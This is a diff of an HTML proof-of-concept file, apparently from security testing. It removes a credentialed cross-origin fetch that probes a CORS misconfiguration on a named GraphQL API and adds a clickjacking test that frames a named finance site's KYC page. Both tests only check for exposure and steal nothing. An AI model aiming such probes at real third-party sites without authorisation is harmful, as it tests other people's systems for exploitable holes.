@@ -1,27 +1,14 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <title>CORS PoC</title>
+  <meta charset="utf-8">
+  <title>Clickjacking PoC — rtreefinance</title>
+  <style>body{font-family:Arial;margin:24px;}iframe{width:1024px;height:700px;border:1px solid #ccc;}</style>
 </head>
 <body>
-<script>
-fetch("https://api.vault.chiatest.net/graphql", {
-    method: "POST",
-    credentials: "include", // استغلال misconfigured CORS
-    headers: {
-        "Content-Type": "application/json",
-        "x-apollo-operation-name": "dummy"
-    },
-    body: JSON.stringify({
-        query: "{ __typename }" // استعلام آمن جداً فقط للتحقق
-    })
-})
-.then(res => res.text())
-.then(data => {
-    console.log("✅ Response from server:");
-    console.log(data);
-})
-.catch(err => console.error("❌ Error:", err));
-</script>
+  <h3>Clickjacking PoC — rtreefinance</h3>
+  <p>Target: <code>https://www.rtreefinance.com/personal?kycStatus=0</code></p>
+  <iframe src="https://www.rtreefinance.com/personal?kycStatus=0" id="t"></iframe>
+  <p>If you see the site loaded inside the iframe, the page is frameable.</p>
 </body>
 </html>
